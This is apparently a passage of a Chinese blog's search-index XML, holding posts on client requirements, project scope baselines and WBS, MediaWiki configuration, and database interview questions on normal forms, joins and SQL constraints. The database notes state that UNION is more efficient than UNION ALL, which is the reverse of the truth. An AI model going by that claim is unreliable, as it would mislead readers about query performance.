title="条条大路通罗马"></a>条条大路通罗马</h3><p>对于客户提出的需求，不要一味的迁就，客户永远是对的的思想在项目开发过程中不一定正确。项目成功的标志应该是在规定的时间内利用有效的资源完成项目并使客户满意，为了一味满足客户的需求，而使项目进度超期、预算超期都不能算成功的项目。当客户提出一个不好解决的需求时，我们只要了解客户的目的，帮助客户分析后应该可以找出其它同样能达到相应效果的方案来，并让客户知道他的方案会给项目带来什么样的影响，客户还是会接受我们意见的，这样比与客户直接冲突要理智。</p><p>综合以上，项目需求的管理是一个复杂的过程，它涉及到项目所有相关人的利益。有效的避免与客户的冲突，多给客户一些中肯的意见。同时，也要让客户参与到项目的各个阶段，要让客户了解项目的各个过程，让客户了解我们公司和团队，建立起信任度，在有信任的前提下做事，友好的沟通，会让我们工作起来更加舒畅。</p>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 需求 </tag>
            
            <tag> 项目 </tag>
            
            <tag> 项目管理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>项目管理三大基准（一）：范围基准</title>
      <link href="/154.html"/>
      <url>/154.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>对于产品经理来说，项目管理是必备的技能，同时，项目管理也很考验产品经理自身的能力。本文作者为我们罗列了产品经理的三大基准，在第一篇，作者主要交代了项目的四要素、范围管理的意义、范围基准生成流程、生成范围基准，希望对你有所帮助。</p></blockquote><h2 id="一、项目的四要素"><a href="#一、项目的四要素" class="headerlink" title="一、项目的四要素"></a>一、项目的四要素</h2><p>项目的四要素是范围、进度、成本、质量。</p><p>假如你接到一个项目：带领一个小团队在一条1000米的道路左侧种500棵石榴树，右侧种500棵核桃树；10天内完成，预算10万元；要求是存活率100%，道路同侧距离间隔相等，且两边对齐。</p><p>此项目的四要素分别是：</p><ul><li>范围：在一条1000米的道路左侧种500棵石榴树，右侧种500棵核桃树；</li><li>进度：10天内完成；</li><li>成本：预算10万元；</li><li>质量：存活率100%，道路同侧距离间隔相等，且两边对齐</li></ul><h2 id="二、范围管理的意义"><a href="#二、范围管理的意义" class="headerlink" title="二、范围管理的意义"></a>二、范围管理的意义</h2><p>本文主要描述的是项目范围，项目范围管理是指明确项目的边界在哪里，只做在项目边界内的工作，项目边界之外的工作一律不作。</p><p>若所做工作超出项目范围，则被视为范围蔓延，也叫“镀金”。理论上来说镀金的项目是失败的，因为用于镀金是要占用项目资源的，这些资源都是有成本的。</p><h2 id="三、范围基准生成流程"><a href="#三、范围基准生成流程" class="headerlink" title="三、范围基准生成流程"></a>三、范围基准生成流程</h2><p>项目范围基准的生成需要经过三个过程：收集需求、定义范围、创建WBS。</p><ul><li>收集需求：收集和整理客户的预期和期望，明确客户想要什么；</li><li>定义范围：把收集到的需求进行整理和分析，明确哪些需求应纳入项目范围，明确项目边界；</li><li>创建WBS：把边界内的进行梳理，形成范围基准。</li></ul><h3 id="1-收集需求"><a href="#1-收集需求" class="headerlink" title="1. 收集需求"></a>1. 收集需求</h3><p>收集需求是为了定义项目范围而做的准备，所以收集的需求要尽可能的明确和具体。</p><p><img src="https://cos.gjcloak.xyz/pigo/202211140823538.png?imageMogr2/format/webp/interlace/1/quality/80" alt="范围基准线" title="范围基准线"></p><p>收集需求完毕后生成两个重要文件：需求文件和需求跟踪矩阵</p><p><strong>1）需求文件</strong></p><p>描述单一需求如何满足项目相关的业务需求，需求文件是一个清单，如下图：</p><p><img src="https://cos.gjcloak.xyz/pigo/202211140823106.png?imageMogr2/format/webp/interlace/1/quality/80" alt="范围基准线" title="范围基准线"></p><p><strong>需求跟踪矩阵</strong></p><p>把产品需求从其来源连接到满足需求的可交付成果和项目目标的一种表格，用于确保每个功能都有其对应的需求且每个需求都能被跟踪和交付，如下图：</p><p><img src="https://cos.gjcloak.xyz/pigo/202211140823172.png?imageMogr2/format/webp/interlace/1/quality/80" alt="范围基准线" title="范围基准线"></p><h3 id="2-定义范围"><a href="#2-定义范围" class="headerlink" title="2. 定义范围"></a>2. 定义范围</h3><p>定义范围是为了详细可交付成果的边界和验收标准：</p><p><img src="https://cos.gjcloak.xyz/pigo/202211140823740.png?imageMogr2/format/webp/interlace/1/quality/80" alt="范围基准线" title="范围基准线"></p><p>定义范围需要使用需求文件来进行产品分析，需要输出项目范围说明书。需要注意的是需求文件里的需求不是全部都需要纳入本项目范围的，定义范围就是为了明确哪些需求需要在本项目上实现。</p><p><strong>1）项目范围说明书</strong></p><p>项目范围说明书一般包括：项目范围描述（渐进明细）、可交付成果、验收标准、项目除外责任。</p><p><img src="https://cos.gjcloak.xyz/pigo/202211140824412.png?imageMogr2/format/webp/interlace/1/quality/80" alt="范围基准线" title="范围基准线"></p><h3 id="3-创建WBS（Work-Breakdown-Structure：工作分解结构）"><a href="#3-创建WBS（Work-Breakdown-Structure：工作分解结构）" class="headerlink" title="3. 创建WBS（Work Breakdown Structure：工作分解结构）"></a>3. 创建WBS（Work Breakdown Structure：工作分解结构）</h3><p>如果说定义范围是需要把项目的边界定义清楚，那么创建WBS就是把项目边界内的的事情梳理清楚。</p><p><img src="https://cos.gjcloak.xyz/pigo/202211140824095.png?imageMogr2/format/webp/interlace/1/quality/80" alt="范围基准线" title="范围基准线"></p><p>创建WBS是把项目可交付成果和项目工作分解为较小的更易于管理的组件，分解时应注意不重不漏。</p><p>创建WBS输出两个重要组件：WBS和WBS词典</p><p><strong>1）WBS</strong></p><ul><li>工作包：WBS的最底层，通常带有编号；</li><li>规划包：现阶段还不太清楚是否需要继续拆分；</li><li>控制账户：每个工作包或规划包都有一个只能部门认领，在这个只能部门设置一个控制点，即为控制账户。</li></ul><p>每个控制账户可能包含多个工作包或规划包，但每个工作包或规划包只属于某一个控制账户。所做工作必须严格按照WBS来做，若有多余则需要走变更流程把它去掉；若需多做，则需要走变更流程把它加进去。</p><p>WBS（以项目阶段作为第二层），如下图：</p><p><img src="https://cos.gjcloak.xyz/pigo/202211140824676.png?imageMogr2/format/webp/interlace/1/quality/80" alt="范围基准线" title="范围基准线"></p><p>WBS（以可交付成果作为第二层），如下图：</p><p><img src="https://cos.gjcloak.xyz/pigo/202211140825242.png?imageMogr2/format/webp/interlace/1/quality/80" alt="范围基准线" title="范围基准线"></p><p><strong>2）WBS词典</strong></p><p>WBS词典是针对WBS的每个组件的详细描述，包括：工作描述、进度、质量、成本、所需资源、验收标准等，如下图：</p><p><img src="https://cos.gjcloak.xyz/pigo/202211140825952.png?imageMogr2/format/webp/interlace/1/quality/80" alt="范围基准线" title="范围基准线"></p><h2 id="四、生成范围基准"><a href="#四、生成范围基准" class="headerlink" title="四、生成范围基准"></a>四、生成范围基准</h2><p>把定义范围产生的项目范围说明书和创建WBS生成的WBS和WBS词典，进行组合便可形成范围基准，如下图所示：</p><p><img src="https://cos.gjcloak.xyz/pigo/202211140825942.png?imageMogr2/format/webp/interlace/1/quality/80" alt="范围基准线" title="范围基准线"></p>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 项目管理 </tag>
            
            <tag> 范围基准 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MediaWiki 相关自定义设置</title>
      <link href="/149.html"/>
      <url>/149.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>主要用来记录配置，以便后续自己查阅，不定时更新</p></blockquote><h2 id="修改维基名称"><a href="#修改维基名称" class="headerlink" title="修改维基名称"></a>修改维基名称</h2><p>在wiki代码根目录，找到 <code>LocalSettings.php</code> ，修改相应代码为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$wgSitename = &quot;你的百科名称&quot;;</span><br></pre></td></tr></table></figure><h2 id="修改logo"><a href="#修改logo" class="headerlink" title="修改logo"></a>修改logo</h2><p>现将文件上传到对应目录，即 <code>/opt/lampp/htdocs/wiki/resources/assets/</code> 图片大小改动可以使用这个网站</p><p>在wiki代码根目录，找到 <code>LocalSettings.php</code> ，修改相应代码为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">## The URL path to the logo.  Make sure you change this from the default,</span><br><span class="line">## or else you&#x27;ll overwrite your logo when you upgrade!</span><br><span class="line">$wgLogo = &quot;$wgResourceBasePath/resources/assets/wiki.gif&quot;;</span><br></pre></td></tr></table></figure><p>即将原先的 <code>wiki.png</code> 改为 <code>wiki.gif</code></p><h2 id="页面底部显示最后修订人名称"><a href="#页面底部显示最后修订人名称" class="headerlink" title="页面底部显示最后修订人名称"></a>页面底部显示最后修订人名称</h2><p>在wiki代码根目录，找到 <code>LocalSettings.php</code> ，增加代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$wgMaxCredits = 2;</span><br></pre></td></tr></table></figure><p>这样一来就可以显示最后修改的2条记录，比如说</p><p>本页面由公爵最后编辑于2022年10月18日 (星期二) 17:01。 基于Duke’s Knowledge用户帝国执行官的工作。</p><h2 id="关闭游客注册-修改-查看权限"><a href="#关闭游客注册-修改-查看权限" class="headerlink" title="关闭游客注册&#x2F;修改&#x2F;查看权限"></a>关闭游客注册&#x2F;修改&#x2F;查看权限</h2><p>在wiki代码根目录，找到 <code>LocalSettings.php</code> ，在最后面附加如下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$wgGroupPermissions[&#x27;*&#x27;][&#x27;createaccount&#x27;] = true;</span><br><span class="line">$wgGroupPermissions[&#x27;*&#x27;][&#x27;read&#x27;] = true;</span><br><span class="line">$wgGroupPermissions[&#x27;*&#x27;][&#x27;edit&#x27;] = false;</span><br></pre></td></tr></table></figure><p>即打开游客 <code>注册</code> &#x2F; <code>浏览</code> 权限，关闭 <code>修改</code> 权限</p><h2 id="定制侧边栏"><a href="#定制侧边栏" class="headerlink" title="定制侧边栏"></a>定制侧边栏</h2><p>进入URL： <code>/index.php/MediaWiki:Sidebar</code></p><p>我们将上面使用的那个分类加入侧边栏，增加一行** 分类:Wiki定制化更好地使用wiki,其中后的文案，即你要显示在侧边栏的文本。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">* navigation</span><br><span class="line">** mainpagemainpage-description</span><br><span class="line">** recentchanges-urlrecentchanges</span><br><span class="line">** helppagehelp</span><br><span class="line">** 分类:Wiki定制化更好地使用wiki</span><br><span class="line"></span><br><span class="line">* SEARCH</span><br><span class="line">* TOOLBOX</span><br><span class="line">* LANGUAGES</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MediaWiki </tag>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库面试题</title>
      <link href="/d4eb4c98.html"/>
      <url>/d4eb4c98.html</url>
      
        <content type="html"><![CDATA[<h2 id="数据库基础知识"><a href="#数据库基础知识" class="headerlink" title="数据库基础知识"></a>数据库基础知识</h2><h3 id="为什么要使用数据库"><a href="#为什么要使用数据库" class="headerlink" title="为什么要使用数据库"></a>为什么要使用数据库</h3><blockquote><p>答题思路一：内存、文件和数据库的比较</p></blockquote><p>如果将<strong>数据保存在内存</strong>中，虽然说存取速度快，但是会导致数据不能永久的保存。</p><p>如果将<strong>数据保存在文件</strong>中，可以解决数据永久保存的问题，但是却引发了新的问题：速度比内存操作慢，频繁的 IO 操作，而且查询数据不方便。</p><p>但是将<strong>数据保存在数据库</strong>中，完美的解决了以上所有问题：数据可以永久保存，通过使用 SQL 语句，使得查询方便效率高，并且管理数据方便。</p><p>所以要使用数据库。</p><blockquote><p>答题思路二：使用数据库的好处</p></blockquote><ul><li>支持数据的独立性和有效访问</li><li>减少了应用开发时间</li><li>支持对数据完整性和安全性的控制</li><li>支持并发访问</li><li>支持对故障的恢复</li></ul><h3 id="数据库的发展阶段-⭐"><a href="#数据库的发展阶段-⭐" class="headerlink" title="数据库的发展阶段 ⭐"></a>数据库的发展阶段 ⭐</h3><p>人工管理阶段&gt;&gt;文件系统阶段&gt;&gt;数据库系统阶段</p><h3 id="文件系统与数据库系统之间的比较"><a href="#文件系统与数据库系统之间的比较" class="headerlink" title="文件系统与数据库系统之间的比较"></a>文件系统与数据库系统之间的比较</h3><ul><li>数据库可以通过 DBMS 直接进行很多操作，而文件的话只提供了简单的操作。</li><li>用文件的话，要针对不同的文件结构编写不同的代码。</li><li>由于实际应用中并发同时访问导致数据访问不一致。【文件没有解决办法，需要在应用软件层解决，而 DBMS 中有】</li><li>故障处理【文件系统不具备这个能力，但DBMS会自动恢复】</li><li>安全和访问控制</li></ul><h3 id="什么是数据库系统"><a href="#什么是数据库系统" class="headerlink" title="什么是数据库系统"></a>什么是数据库系统</h3><p>在计算机系统中引入数据库后的系统。它是由数据库、数据库用户、计算机软硬件、数据库管理员构成。</p><h3 id="什么是数据库"><a href="#什么是数据库" class="headerlink" title="什么是数据库"></a>什么是数据库</h3><p>数据库是长期存在计算机内、有组织的、可共享数据集合。</p><h3 id="什么是数据库的约束"><a href="#什么是数据库的约束" class="headerlink" title="什么是数据库的约束"></a>什么是数据库的约束</h3><p>NULL&#x2F;NOT NULL 约束、UNIQUE 约束、PRIMARY KEY 约束、FOREIGN KEY 约束、CHECK 约束</p><h3 id="什么是数据库管理系统"><a href="#什么是数据库管理系统" class="headerlink" title="什么是数据库管理系统"></a>什么是数据库管理系统</h3><p>用于用户与操作系统之间的一层数据管理软件</p><h3 id="什么是数据模型"><a href="#什么是数据模型" class="headerlink" title="什么是数据模型"></a>什么是数据模型</h3><p>数据模型是一种标识实体类型及其实体间联系的模型。典型的数据模型有网状模型、层次模型和关系模型。</p><h3 id="什么是规范化"><a href="#什么是规范化" class="headerlink" title="什么是规范化"></a>什么是规范化</h3><p>从关系数据库的表中，除去冗余数据的过程称为规范化。包括：精简数据库的结构，从表中删除冗余的列，标识所有依赖于其它数据的数据</p><h3 id="简述数据库的三级模式结构"><a href="#简述数据库的三级模式结构" class="headerlink" title="简述数据库的三级模式结构"></a>简述数据库的三级模式结构</h3><ul><li><strong>内模式</strong>：也称存储模式。数据物理结构和存储方式的描述，是数据在数据库中的组织方式</li><li><strong>模式</strong>：也称逻辑模式。是数据库中全体数据成员的逻辑结构和特征的描述</li><li><strong>外模式</strong>：也称用户模式。是数据库用户能看见和使用的局部数据的逻辑结构和特征的描述</li></ul><p><img src="https://cos.gjcloak.xyz/NoteBook/20200509142722.png" alt="数据库系统的三级模式结构" title="数据库系统的三级模式结构"></p><h3 id="数据库系统的生命周期"><a href="#数据库系统的生命周期" class="headerlink" title="数据库系统的生命周期"></a>数据库系统的生命周期</h3><ul><li>数据库系统的规划阶段</li><li>数据库设计</li><li>在数据库内创建加载数据</li><li>基于数据库开发应用程序、管理和维护</li><li>数据库重构</li></ul><h3 id="什么是-SQL？"><a href="#什么是-SQL？" class="headerlink" title="什么是 SQL？"></a>什么是 SQL？</h3><p>结构化查询语言（Structured Query Language）简称 SQL，是一种数据库查询语言。</p><p>作用：用于存取数据、查询、更新和管理关系数据库系统。</p><h3 id="什么是-MySQL"><a href="#什么是-MySQL" class="headerlink" title="什么是 MySQL?"></a>什么是 MySQL?</h3><p>MySQL是一个关系型数据库管理系统，由瑞典 MySQL AB 公司开发，属于 Oracle 旗下产品。MySQL 是最流行的关系型数据库管理系统之一，在 WEB 应用方面，MySQL 是最好的 RDBMS (Relational Database Management System，关系数据库管理系统) 应用软件之一。在 Java 企业级开发中非常常用，因为 MySQL 是开源免费的，并且方便扩展。</p><h3 id="范式的定义-⭐"><a href="#范式的定义-⭐" class="headerlink" title="范式的定义 ⭐"></a>范式的定义 ⭐</h3><p>改造关系模式，通过分解关系模型来消除其中不合适的数据依赖，以决绝插入异常，删除异常，数据用余。</p><h3 id="数据库三大范式是什么"><a href="#数据库三大范式是什么" class="headerlink" title="数据库三大范式是什么"></a>数据库三大范式是什么</h3><p>第一范式（1NF）：关系模式 R 中每个列都不可以再拆分。</p><p>第二范式（2NF）：在第一范式的基础上，非主键列完全依赖于主键，而不能是依赖于主键的一部分。</p><p>第三范式：在第二范式的基础上，非主键列只依赖于主键，不依赖于其他非主键。</p><p>在设计数据库结构的时候，要尽量遵守三范式，如果不遵守，必须有足够的理由。比如性能。事实上我们经常会为了性能而妥协数据库的设计。</p><h3 id="mysql有关权限的表都有哪几个"><a href="#mysql有关权限的表都有哪几个" class="headerlink" title="mysql有关权限的表都有哪几个"></a>mysql有关权限的表都有哪几个</h3><blockquote><p>MySQL服务器通过权限表来控制用户对数据库的访问，权限表存放在mysql数据库里，由mysql_install_db脚本初始化。这些权限表分别user，db，table_priv，columns_priv和host。下面分别介绍一下这些表的结构和内容：</p><p>user权限表：记录允许连接到服务器的用户帐号信息，里面的权限是全局级的。<br>db权限表：记录各个帐号在各个数据库上的操作权限。<br>table_priv权限表：记录数据表级的操作权限。<br>columns_priv权限表：记录数据列级的操作权限。<br>host权限表：配合db权限表对给定主机上数据库级操作权限作更细致的控制。这个权限表不受GRANT和REVOKE语句的影响。</p></blockquote><h3 id="MySQL的binlog有有几种录入格式？分别有什么区别？"><a href="#MySQL的binlog有有几种录入格式？分别有什么区别？" class="headerlink" title="MySQL的binlog有有几种录入格式？分别有什么区别？"></a>MySQL的binlog有有几种录入格式？分别有什么区别？</h3><blockquote><p>有三种格式，statement，row和mixed。</p><p>statement模式下，每一条会修改数据的sql都会记录在binlog中。不需要记录每一行的变化，减少了binlog日志量，节约了IO，提高性能。由于sql的执行是有上下文的，因此在保存的时候需要保存相关的信息，同时还有一些使用了函数之类的语句无法被记录复制。<br>row级别下，不记录sql语句上下文相关信息，仅保存哪条记录被修改。记录单元为每一行的改动，基本是可以全部记下来但是由于很多操作，会导致大量行的改动(比如alter table)，因此这种模式的文件保存的信息太多，日志量太大。<br>mixed，一种折中的方案，普通操作使用statement记录，当无法使用statement的时候使用row。<br>此外，新版的MySQL中对row级别也做了一些优化，当表结构发生变化的时候，会记录语句而不是逐行记录。</p></blockquote><h3 id="什么是数据字典"><a href="#什么是数据字典" class="headerlink" title="什么是数据字典"></a>什么是数据字典</h3><p>数据字典是关系数据库管理系统内部的一组系统表，它<strong>记录了数据库中所有的定义信息</strong>，包括关系模式定义、视图定义、索引定义、完整性约束定义、各类用户对数据库的操作权限、统计信息等。<strong>关系数据库管理系统在执行 SQL 的数据定义语句时，实际上就是在更新数据字典中的相应信息</strong></p><h3 id="Oracle-和-MySQL-的区别"><a href="#Oracle-和-MySQL-的区别" class="headerlink" title="Oracle 和 MySQL 的区别"></a>Oracle 和 MySQL 的区别</h3><p>（1）库函数不同。</p><p>（2）Oracle 是用表空间来管理的，MySQL 不是。</p><p>（3）显示当前所有的表、用户、改变连接用户、显示当前连接用户、执行外部脚本的语句的不同。</p><p>（4）分页查询时候时候，MySQL 用 limit ，Oracle用rownum。</p><p>（5）SQL 的语法的不同。</p><h3 id="数据库和非关系型数据库比较"><a href="#数据库和非关系型数据库比较" class="headerlink" title="数据库和非关系型数据库比较"></a>数据库和非关系型数据库比较</h3><h2 id="关系数据库"><a href="#关系数据库" class="headerlink" title="关系数据库"></a>关系数据库</h2><h3 id="关系型数据库和非关系型数据库比较"><a href="#关系型数据库和非关系型数据库比较" class="headerlink" title="关系型数据库和非关系型数据库比较"></a>关系型数据库和非关系型数据库比较</h3><p><strong>关系型数据库</strong>：</p><ul><li>采用了关系模型来组织数据的数据库，以行和列形式存储数据，以便于用户理解。</li><li>通用的 SQL 语言使得操作关系型数据库非常方便。</li><li>关系型数据库遵循 ACID 原则。</li><li>常见的关系型数据库比如 MySQL，Oracle</li></ul><p><strong>关系型数据库存在的问题</strong>：</p><ul><li>网站的用户并发性非常高，往往达到每秒上万次读写请求，对于传统关系型数据库来说，硬盘 I&#x2F;O 是一个很大的瓶颈</li><li>网站每天产生的数据量是巨大的，对于关系型数据库来说，在一张包含海量数据的表中查询，效率是非常低的。因此，关系型数据不适合持久存储海量数据</li><li>很难进行横向扩展（增加服务器），也就是说想要提高数据处理能力，要使用性能更好的计算机（纵向扩展）</li><li>性能欠佳：导致关系型数据库性能欠佳的最主要原因就是多表的关联查询，为了保证数据库的ACID特性，必须尽量按照范式要求设计数据库，关系数据库中的表存储的往往是一个固定的、格式化的数据结构</li></ul><p>而非关系型数据库就可以很好的解决关系型数据库很难解决的大数据问题</p><p><strong>非关系型数据库 NoSQL</strong>：</p><ul><li>非关系型数据库以键值对存储，且结构不固定，每一个元组可以有不一样的字段，每个元组可以根据需要增加一些自己的键值对，不局限于固定的结构，可以减少一些时间和空间的开销。</li><li>支持分布式存储，容易进行横向扩展</li><li>不遵循 ACID 特性（不提供对事务的处理）</li><li>常见的非关系型数据库比如 Redis、MongoDB、Elasticsearch</li></ul><h3 id="数据库连接池"><a href="#数据库连接池" class="headerlink" title="数据库连接池"></a>数据库连接池</h3><p>① 概述</p><p>数据库连接池是负责分配、管理和释放数据库连接，它<strong>允许应用程序重复使用一个现有的数据库连接</strong>，而不是每次访问数据库的时候都需要重新建立一次连接。</p><p>② 为什么要使用连接池</p><p>数据库连接是一种关键的有限的昂贵的资源，这一点在多用户的网页应用程序中体现得尤为突出。 一个数据库连接对象均对应一个物理数据库连接，每次操作都打开一个物理连接，使用完都关闭连接，这样造成系统的性能低下。</p><p>数据库连接池的解决方案是在应用程序启动时建立足够的数据库连接，并将这些连接组成一个连接池，由应用程序动态地对池中的连接进行申请、使用和释放。对于多于连接池中连接数的并发请求，应该在请求队列中排队等待。并且应用程序可以根据池中连接的使用率，动态增加或减少池中的连接数。</p><p>连接池技术尽可能多地重用了消耗内存地资源，大大节省了内存，提高了服务器地服务效率，能够支持更多的客户服务。通过使用连接池，将大大提高程序运行效率，同时，我们可以通过其自身的管理机制来监视数据库连接的数量、使用情况等。</p><p>③ 传统的连接机制与连接池运行机制区别</p><p>执行一个 SQL 命令</p><p><strong>不使用数据库连接池的步骤</strong>：</p><ul><li>TCP建立连接三次握手</li><li>MySQL认证三次握手</li><li>真正的SQL执行</li><li>MySQL关闭</li><li>TCP四次握手关闭</li></ul><p>可以看到，为了执行一条SQL，却多了非常多网络交互，应用需要频繁的创建连接和关闭连接。</p><p><strong>使用数据库连接池的步骤</strong>：</p><p>第一次访问的时候，需要建立连接。 但是之后的访问，均会复用之前创建的连接，直接执行SQL语句。</p><h3 id="列举几种表连接方式"><a href="#列举几种表连接方式" class="headerlink" title="列举几种表连接方式"></a>列举几种表连接方式</h3><p>内连接、自连接、外连接（左、右、全）、交叉连接</p><h3 id="什么是内连接、外连接、交叉连接"><a href="#什么是内连接、外连接、交叉连接" class="headerlink" title="什么是内连接、外连接、交叉连接"></a>什么是内连接、外连接、交叉连接</h3><ul><li><strong>内连接 inner join:</strong> 只连接匹配的行（默认），只有两个元素表相匹配的才能在结果集中显示</li><li><strong>左外连接 left outer join:</strong> 左边为驱动表，驱动表的数据全部显示，匹配表的不匹配的不会显示。</li><li><strong>右外连接 right outer join:</strong> 右边为驱动表，驱动表的数据全部显示，匹配表的不匹配的不会显示</li><li><strong>全外连接 outer join:</strong> 连接的表中不匹配的数据全部会显示出来。</li><li><strong>交叉连接 cross join:</strong> 生成笛卡尔积，它不使用任何匹配或者选取条件，而是直接将一个数据源中的每个行与另一个数据源的每个行都匹配，显示的结果是连接表数的乘积。</li></ul><h3 id="超键、候选键、主键、外键分别是什么"><a href="#超键、候选键、主键、外键分别是什么" class="headerlink" title="超键、候选键、主键、外键分别是什么"></a>超键、候选键、主键、外键分别是什么</h3><ul><li><strong>超键</strong>：在关系中能唯一标识元组的属性集称为关系模式的超键。一个属性可以为作为一个超键，多个属性组合在一起也可以作为一个超键。超键包含候选键和主键。</li><li><strong>候选键</strong>：即最小超键，即没有冗余元素的超键。候选键中的元素称为<strong>主属性</strong></li><li><strong>主键</strong>：候选键中选出一个作为主键，一个数据列只能有一个主键，且主键的取值不能缺失，即不能为空值（Null）。</li><li><strong>外键</strong>：在一个表中存在的另一个表的主键称此表的外键。</li></ul><h3 id="主键和外键的区别"><a href="#主键和外键的区别" class="headerlink" title="主键和外键的区别"></a>主键和外键的区别</h3><p>主键在本表中是唯一的、不可为空的，外键可以重复可以为空；外键和另一张表的主键关联，不能创建对应表中不存在的外键。</p><h3 id="如何维护数据库的完整性和一致性"><a href="#如何维护数据库的完整性和一致性" class="headerlink" title="如何维护数据库的完整性和一致性"></a>如何维护数据库的完整性和一致性</h3><p>尽可能使用约束，如check,主键，外键，非空字段等来约束，这样做效率最高，也最方便。其次是使用触发器，这种方法可以保证，无论什么业务系统务逻辑，但这样做麻烦，编程复杂，效率低下。</p><h3 id="什么是主码-什么是外码"><a href="#什么是主码-什么是外码" class="headerlink" title="什么是主码?什么是外码"></a>什么是主码?什么是外码</h3><p>若关系中某一属性组的值能唯一地标识一个元组，而其子集不能，则称该属性组为候选码，若一个关系有多个候选码，则选定其中一个为主码。</p><p>如果F是基本关系R的一个或一组属性，但不是关系R的码，Ks是基本关系S的主码。如果F与Ks相对应，则称F是R的外码。</p><h3 id="完整性约束"><a href="#完整性约束" class="headerlink" title="完整性约束"></a>完整性约束</h3><p>数据库的完整性是指数据的正确性和相容性。数据的正确性是指数据是符合现实世界语义、反映当前实际状况的。数据的相容性是指数据库同一对象在不同关系表中的数据是符合逻辑的。</p><p>l 实体完整性：若属性A是基本关系B的主属性，则A不能取空值（所谓空值是指不知道，不存在，无意义的值）</p><p>l 参照完整性：若属性F是基本关系R的外码，它与基本关系S的主码Ks相对应，则对于R中每个元组在F上的值必须：</p><p>² 或者取空值（F的每个属性值均为空值）</p><p>² 或者等于S中某个元组的主码值</p><p>（某个同学班长属性可以是尚为选出班长，也可以是本关系中某个元组的学号值）</p><p>l 用户定义完整性：针对某一具体关系数据库的约束条件，反映某一具体应用涉及的数据必须满足的语义要求（如某个属性必须取唯一值，某个非主属性不能取空值）</p><h2 id="常用-SQL-语句"><a href="#常用-SQL-语句" class="headerlink" title="常用 SQL 语句"></a>常用 SQL 语句</h2><h3 id="SQL-的四个组成部分-⭐"><a href="#SQL-的四个组成部分-⭐" class="headerlink" title="SQL 的四个组成部分 ⭐"></a>SQL 的四个组成部分 ⭐</h3><p>1、数据库模式定义语言DDL：create用来创建数据库中的各种对象——表、视图、索引、同义词、聚簇等</p><p>2、数据查询语言dql：基本结构是由SELECT子句，FROM子句和WHERE子句组成的查询块</p><p>3、数据操纵语言dml：插入INSERT、更新UPDATE和删除DELETE</p><p>4、数据控制语言dcl：用来授予或回收访问数据库的某种特权，并控制数据库操纵事物发生的时间和效果，对数据库实行监视等</p><h3 id="SQL-约束有哪几种？"><a href="#SQL-约束有哪几种？" class="headerlink" title="SQL 约束有哪几种？"></a>SQL 约束有哪几种？</h3><blockquote><p>NOT NULL: 用于控制字段的内容一定不能为空（NULL）。<br>UNIQUE: 控件字段内容不能重复，一个表允许有多个 Unique 约束。<br>PRIMARY KEY: 也是用于控件字段内容不能重复，但它在一个表只允许出现一个。<br>FOREIGN KEY: 用于预防破坏表之间连接的动作，也能防止非法数据插入外键列，因为它必须是它指向的那个表中的值之一。<br>CHECK: 用于控制字段的值范围。</p></blockquote><h3 id="六种关联查询"><a href="#六种关联查询" class="headerlink" title="六种关联查询"></a>六种关联查询</h3><blockquote><ul><li>交叉连接（CROSS JOIN）</li><li>内连接（INNER JOIN）</li><li>外连接（LEFT JOIN&#x2F;RIGHT JOIN）</li><li>联合查询（UNION与UNION ALL）</li><li>全连接（FULL JOIN）</li><li>交叉连接（CROSS JOIN）</li></ul></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM A,B(,C)或者SELECT * FROM A CROSS JOIN B (CROSS JOIN C)#没有任何关联条件，结果是笛卡尔积，结果集会很大，没有意义，很少使用内连接（INNER JOIN）SELECT * FROM A,B WHERE A.id=B.id或者SELECT * FROM A INNER JOIN B ON A.id=B.id多表中同时符合某种条件的数据记录的集合，INNER JOIN可以缩写为JOIN</span><br></pre></td></tr></table></figure><p>内连接分为三类</p><p>等值连接：ON A.id&#x3D;B.id<br>不等值连接：ON A.id &gt; B.id<br>自连接：SELECT * FROM A T1 INNER JOIN A T2 ON T1.id&#x3D;T2.pid<br>外连接（LEFT JOIN&#x2F;RIGHT JOIN）</p><p>左外连接：LEFT OUTER JOIN, 以左表为主，先查询出左表，按照ON后的关联条件匹配右表，没有匹配到的用NULL填充，可以简写成LEFT JOIN<br>右外连接：RIGHT OUTER JOIN, 以右表为主，先查询出右表，按照ON后的关联条件匹配左表，没有匹配到的用NULL填充，可以简写成RIGHT JOIN<br>联合查询（UNION与UNION ALL）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM A UNION SELECT * FROM B UNION ...</span><br></pre></td></tr></table></figure><p>就是把多个结果集集中在一起，UNION前的结果为基准，需要注意的是联合查询的列数要相等，相同的记录行会合并<br>如果使用UNION ALL，不会合并重复的记录行<br>效率 UNION 高于 UNION ALL<br>全连接（FULL JOIN）</p><p>MySQL不支持全连接<br>可以使用LEFT JOIN 和UNION和RIGHT JOIN联合使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 